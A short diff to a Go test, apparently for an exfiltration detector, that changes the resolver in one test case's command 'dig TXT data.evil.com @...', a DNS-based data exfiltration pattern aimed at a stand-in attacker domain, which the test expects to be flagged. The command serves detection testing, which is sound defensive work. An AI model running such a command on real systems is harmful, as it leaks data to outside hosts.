@@ -29,7 +29,7 @@ func TestExfilExternalDetection(t *testing.T) {
 		},
 		{
 			name:             "dig TXT external resolver",
-			cmd:              "dig TXT data.evil.com @8.8.8.8",
+			cmd:              "dig TXT data.evil.com @198.51.100.53",
 			expectFinding:    true,
 			expectExtIPCheck: false,
 		},
